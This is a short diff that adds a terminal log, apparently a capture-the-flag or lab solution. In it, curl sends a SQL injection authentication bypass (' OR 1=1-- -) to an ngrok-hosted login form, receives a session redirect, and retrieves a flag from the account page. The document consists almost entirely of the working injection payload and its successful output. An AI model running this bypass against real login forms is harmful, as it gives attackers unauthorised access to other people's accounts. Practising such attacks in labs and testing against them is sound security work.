@@ -1,0 +1,10 @@
+$ curl -sS -i -H 'ngrok-skip-browser-warning: 1' \
+    -d "email=' OR 1=1-- -&password=x" \
+    https://retrace-bondless-linseed.ngrok-free.dev/login
+HTTP/2 302
+location: /account
+set-cookie: session=...; HttpOnly; Path=/
+
+$ curl -sS -H 'ngrok-skip-browser-warning: 1' -b cookies \
+    https://retrace-bondless-linseed.ngrok-free.dev/account | grep -i flag
+flag for the audit console: NFX{sql1_un10n_bas3d_4uth_byp4ss}
